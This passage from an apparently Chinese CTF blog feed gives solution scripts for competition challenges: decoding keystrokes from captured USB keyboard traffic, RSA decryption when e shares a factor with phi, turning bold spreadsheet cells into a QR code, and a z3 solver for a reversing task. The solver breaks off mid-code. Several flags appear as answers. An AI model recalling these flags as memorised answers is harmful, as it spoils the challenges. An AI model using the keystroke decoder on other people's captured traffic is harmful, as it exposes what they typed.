class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>             <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>             <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>             <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,<br>             <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<br>             <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>             <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>) <span class="hljs-comment">#这里是加号冒号的数据</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br> <br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023hwsummer/3.png"><br>赛博厨子直接梭<br><img src="/mdimg/2023hwsummer/4.png"><br><code>flag&#123;ec1b8b96-56a9-f15c-4e39-503e92ab45d2&#125;</code></p><p>咕咕咕了~</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>USB流量</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第七届蓝帽杯半决赛</title>
    <link href="/2023/08/31/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <url>/2023/08/31/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h3><p>CryptoCTF2019原题</p><p><a href="https://4cad.github.io/CTF_Writeups/201908%20CryptoCTF/Clever%20Girl/CryptoCTF%202019%20-%20Clever%20Girl.html">https://4cad.github.io/CTF_Writeups/201908%20CryptoCTF/Clever%20Girl/CryptoCTF%202019%20-%20Clever%20Girl.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>p = <span class="hljs-number">12604273285023995463340817959574344558787108098986028639834181397979984443923512555395852711753996829630650627741178073792454428457548575860120924352450409</span><br>q = <span class="hljs-number">12774247264858490260286489817359549241755117653791190036750069541210299769639605520977166141575653832360695781409025914510310324035255606840902393222949771</span><br>e = <span class="hljs-number">0x10001</span><br>n = <span class="hljs-number">161010103536746712075112156042553283066813155993777943981946663919051986586388748662616958741697621238654724628406094469789970509959159343108847331259823125490271091357244742345403096394500947202321339572876147277506789731024810289354756781901338337411136794489136638411531539112369520980466458615878975406339</span><br>c = <span class="hljs-number">15380535750650959213679345560658190067564859611922563753882617419201718847747207949211621591882732604480600745000879508274349808435529637573773711729853565120321608048340424321537282281161623712479117497156437792084977778826238039385697230676340978078264209760724043776058017336241110097549146883806481148999</span><br><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = gmpy2.invert(e, phi)<br>g = gmpy2.gcd(e, phi)<br>e //= g<br>d = gmpy2.invert(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>m, _ = gmpy2.iroot(m, g)<br><br><span class="hljs-comment">#print(m)</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#b&#x27;flag&#123;2a5a9c6fe94da5ef7edeffebb506b29a&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="排队队吃果果"><a href="#排队队吃果果" class="headerlink" title="排队队吃果果"></a>排队队吃果果</h3><p>手撸按大小排序，接着用脚本处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> openpyxl<br><br><span class="hljs-comment"># 打开Excel文件</span><br>file_path = <span class="hljs-string">&quot;data.xlsx&quot;</span><br>workbook = openpyxl.load_workbook(file_path)<br><br><span class="hljs-comment"># 遍历所有工作表</span><br><span class="hljs-keyword">for</span> sheet_name <span class="hljs-keyword">in</span> workbook.sheetnames:<br>    sheet = workbook[sheet_name]<br><br>    <span class="hljs-comment"># 遍历每个单元格</span><br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> sheet.iter_rows():<br>        <span class="hljs-keyword">for</span> cell <span class="hljs-keyword">in</span> row:<br>            <span class="hljs-comment"># 检查单元格是否为粗体</span><br>            <span class="hljs-keyword">if</span> cell.font.bold:<br>                cell.value = <span class="hljs-string">&quot;0&quot;</span>  <span class="hljs-comment"># 替换粗体文本为&quot;0&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                cell.value = <span class="hljs-string">&quot;1&quot;</span>  <span class="hljs-comment"># 替换细文本为&quot;1&quot;</span><br><br><span class="hljs-comment"># 保存修改后的Excel文件</span><br>workbook.save(<span class="hljs-string">&quot;modified_excel_file.xlsx&quot;</span>)<br></code></pre></td></tr></table></figure><p>将0留白，将1涂黑，得到二维码后扫码即可。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="justamat"><a href="#justamat" class="headerlink" title="justamat"></a>justamat</h3><p>先输入42个字符，然后拼成100个字符，在<code>sub_4051A0</code>处加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_4051A0</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  _DWORD *v1; <span class="hljs-comment">// r10</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// rbp</span><br>  _DWORD *v3; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// r9</span><br>  <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// rcx</span><br>  _DWORD *v7; <span class="hljs-comment">// rax</span><br>  __int64 v8; <span class="hljs-comment">// rsi</span><br>  __int64 v9; <span class="hljs-comment">// rdx</span><br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v11[<span class="hljs-number">400</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-348h] BYREF</span><br>  <span class="hljs-type">char</span> v12[<span class="hljs-number">400</span>]; <span class="hljs-comment">// [rsp+190h] [rbp-1B8h] BYREF</span><br>  <span class="hljs-type">char</span> v13; <span class="hljs-comment">// [rsp+320h] [rbp-28h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v14; <span class="hljs-comment">// [rsp+328h] [rbp-20h]</span><br><br>  v1 = a1;<br>  v2 = v12;<br>  v14 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  qmemcpy(v11, &amp;unk_574020, <span class="hljs-keyword">sizeof</span>(v11));<br>  qmemcpy(v12, &amp;unk_5741C0, <span class="hljs-keyword">sizeof</span>(v12));<br>  v3 = a1 + <span class="hljs-number">10</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )<br>  &#123;<br>    v4 = v11;<br>    v5 = v2;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      v6 = v4;<br>      v7 = v1;<br>      LODWORD(v8) = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v9 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(*(_DWORD *)v6 * *v7++);<br>        v6 += <span class="hljs-number">40</span>;<br>        v8 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v9 + v8);<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v7 != v3 );<br>      <span class="hljs-keyword">if</span> ( *(_DWORD *)v5 != (_DWORD)v8 )<br>      &#123;<br>        result = <span class="hljs-number">0LL</span>;<br>        <span class="hljs-keyword">goto</span> LABEL_10;<br>      &#125;<br>      v4 += <span class="hljs-number">4</span>;<br>      v5 += <span class="hljs-number">4</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v4 != &amp;v11[<span class="hljs-number">40</span>] );<br>    v2 += <span class="hljs-number">40</span>;<br>    v1 += <span class="hljs-number">10</span>;<br>    v3 = v7 + <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> ( v2 != &amp;v13 )<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">break</span>;<br>  &#125;<br>  result = <span class="hljs-number">1LL</span>;<br>LABEL_10:<br>  <span class="hljs-keyword">if</span> ( __readfsqword(<span class="hljs-number">0x28</span>u) != v14 )<br>    sub_52D790(v3, v8, v9, v6, v4, v5);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>每10个字符要循环加密10次，进行相乘。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#n = 0，10，20，30，40，50，60，70，80，90</span><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span>*<br>s=Solver()<br>flag = [Int(<span class="hljs-string">&quot;flag%d&quot;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>)]<br>a = [<span class="hljs-number">0x0001C633</span>, <span class="hljs-number">0x0001DF94</span>, <span class="hljs-number">0x00020EBF</span>, <span class="hljs-number">0x0002BA40</span>, <span class="hljs-number">0x0001E884</span>, <span class="hljs-number">0x000260D1</span>, <span class="hljs-number">0x0001F9B1</span>, <span class="hljs-number">0x0001EA1A</span>, <span class="hljs-number">0x0001EEAA</span>, <span class="hljs-number">0x0001DFB2</span>, <span class="hljs-number">0x0001C1D0</span>, <span class="hljs-number">0x0001EEF2</span>, <span class="hljs-number">0x000216E1</span>, <span class="hljs-number">0x0002BE00</span>, <span class="hljs-number">0x0001FB5E</span>, <span class="hljs-number">0x00025D74</span>, <span class="hljs-number">0x0001F000</span>, <span class="hljs-number">0x000202D6</span>, <span class="hljs-number">0x00020002</span>, <span class="hljs-number">0x0001DDFE</span>, <span class="hljs-number">0x0001C017</span>, <span class="hljs-number">0x0001F08C</span>, <span class="hljs-number">0x000227F6</span>, <span class="hljs-number">0x0002C7BA</span>, <span class="hljs-number">0x000201AE</span>, <span class="hljs-number">0x00027FBF</span>, <span class="hljs-number">0x00020E21</span>, <span class="hljs-number">0x0001FF5C</span>, <span class="hljs-number">0x0001FD62</span>, <span class="hljs-number">0x0001E948</span>, <span class="hljs-number">0x0001BE6E</span>, <span class="hljs-number">0x0001F4D7</span>, <span class="hljs-number">0x00022C8D</span>, <span class="hljs-number">0x0002C353</span>, <span class="hljs-number">0x0001F8DB</span>, <span class="hljs-number">0x00026E1D</span>, <span class="hljs-number">0x0001FF61</span>, <span class="hljs-number">0x0001EA0F</span>, <span class="hljs-number">0x0001F0D6</span>, <span class="hljs-number">0x0001EDA8</span>, <span class="hljs-number">0x0001AD7D</span>, <span class="hljs-number">0x00018218</span>, <span class="hljs-number">0x0001CCD4</span>, <span class="hljs-number">0x000239B6</span>, <span class="hljs-number">0x0001AC4C</span>, <span class="hljs-number">0x00020D7C</span>, <span class="hljs-number">0x0001D967</span>, <span class="hljs-number">0x0001A4F4</span>, <span class="hljs-number">0x0001CAD8</span>, <span class="hljs-number">0x000196AE</span>, <span class="hljs-number">0x0001831B</span>, <span class="hljs-number">0x00017E45</span>, <span class="hljs-number">0x0001D0CF</span>, <span class="hljs-number">0x00023EDF</span>, <span class="hljs-number">0x000181AE</span>, <span class="hljs-number">0x00021760</span>, <span class="hljs-number">0x0001D3B4</span>, <span class="hljs-number">0x000175D6</span>, <span class="hljs-number">0x00017D3A</span>, <span class="hljs-number">0x0001994F</span>, <span class="hljs-number">0x0001189D</span>, <span class="hljs-number">0x00014CCF</span>, <span class="hljs-number">0x0001568E</span>, <span class="hljs-number">0x00017EEB</span>, <span class="hljs-number">0x0001327E</span>, <span class="hljs-number">0x00016A45</span>, <span class="hljs-number">0x00012921</span>, <span class="hljs-number">0x00011FF0</span>, <span class="hljs-number">0x00013643</span>, <span class="hljs-number">0x00011729</span>, <span class="hljs-number">0x00015191</span>, <span class="hljs-number">0x00017D17</span>, <span class="hljs-number">0x00017262</span>, <span class="hljs-number">0x0001A863</span>, <span class="hljs-number">0x00017010</span>, <span class="hljs-number">0x00017B10</span>, <span class="hljs-number">0x00014F9C</span>, <span class="hljs-number">0x000143E8</span>, <span class="hljs-number">0x00015E9B</span>, <span class="hljs-number">0x0001242C</span>, <span class="hljs-number">0x0000F68C</span>, <span class="hljs-number">0x0001192A</span>, <span class="hljs-number">0x000150AD</span>, <span class="hljs-number">0x0001B1A0</span>, <span class="hljs-number">0x00014C60</span>, <span class="hljs-number">0x000182AB</span>, <span class="hljs-number">0x00013F4B</span>, <span class="hljs-number">0x000141A6</span>, <span class="hljs-number">0x00015AA3</span>, <span class="hljs-number">0x000135C9</span>, <span class="hljs-number">0x0001D86F</span>, <span class="hljs-number">0x0001E8FA</span>, <span class="hljs-number">0x0002158D</span>, <span class="hljs-number">0x0002BDAC</span>, <span class="hljs-number">0x00020E4F</span>, <span class="hljs-number">0x00027EE6</span>, <span class="hljs-number">0x000213B9</span>, <span class="hljs-number">0x00020E86</span>, <span class="hljs-number">0x000211FF</span>, <span class="hljs-number">0x0001E1EF</span>]<br>cheng = [<span class="hljs-number">0x000000FE</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x0000001D</span>, <span class="hljs-number">0x000000F6</span>, <span class="hljs-number">0x00000083</span>, <span class="hljs-number">0x000000FF</span>, <span class="hljs-number">0x000000E0</span>, <span class="hljs-number">0x000000B8</span>, <span class="hljs-number">0x000000DD</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x000000C5</span>, <span class="hljs-number">0x000000DE</span>, <span class="hljs-number">0x000000F6</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x0000009F</span>, <span class="hljs-number">0x000000DD</span>, <span class="hljs-number">0x000000D9</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x0000006B</span>, <span class="hljs-number">0x00000019</span>, <span class="hljs-number">0x000000CA</span>, <span class="hljs-number">0x00000073</span>, <span class="hljs-number">0x000000FD</span>, <span class="hljs-number">0x00000087</span>, <span class="hljs-number">0x00000072</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000049</span>, <span class="hljs-number">0x0000007E</span>, <span class="hljs-number">0x000000A9</span>, <span class="hljs-number">0x000000CE</span>, <span class="hljs-number">0x00000091</span>, <span class="hljs-number">0x000000BE</span>, <span class="hljs-number">0x00000041</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x00000060</span>, <span class="hljs-number">0x0000003F</span>, <span class="hljs-number">0x0000002B</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x000000D2</span>, <span class="hljs-number">0x00000090</span>, <span class="hljs-number">0x000000E9</span>, <span class="hljs-number">0x0000008E</span>, <span class="hljs-number">0x000000BA</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0x000000F3</span>, <span class="hljs-number">0x00000041</span>, <span class="hljs-number">0x000000AD</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000069</span>, <span class="hljs-number">0x000000DA</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x000000FD</span>, <span class="hljs-number">0x000000FD</span>, <span class="hljs-number">0x000000E7</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x000000D6</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000059</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x000000CC</span>, <span class="hljs-number">0x00000050</span>, <span class="hljs-number">0x00000087</span>, <span class="hljs-number">0x000000AF</span>, <span class="hljs-number">0x000000FB</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x00000044</span>, <span class="hljs-number">0x0000007F</span>, <span class="hljs-number">0x000000AD</span>, <span class="hljs-number">0x000000F8</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x00000067</span>, <span class="hljs-number">0x0000001D</span>, <span class="hljs-number">0x00000022</span>, <span class="hljs-number">0x00000084</span>, <span class="hljs-number">0x000000AC</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000023</span>, <span class="hljs-number">0x000000DC</span>, <span class="hljs-number">0x000000E6</span>, <span class="hljs-number">0x000000BB</span>, <span class="hljs-number">0x000000D2</span>, <span class="hljs-number">0x000000B8</span>, <span class="hljs-number">0x0000004A</span>, <span class="hljs-number">0x000000BC</span>, <span class="hljs-number">0x000000DE</span>, <span class="hljs-number">0x00000050</span>, <span class="hljs-number">0x0000009C</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0x00000086</span>, <span class="hljs-number">0x0000003A</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x000000DD</span>, <span class="hljs-number">0x000000C3</span>, <span class="hljs-number">0x00000003</span>]<br>tr1 = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span 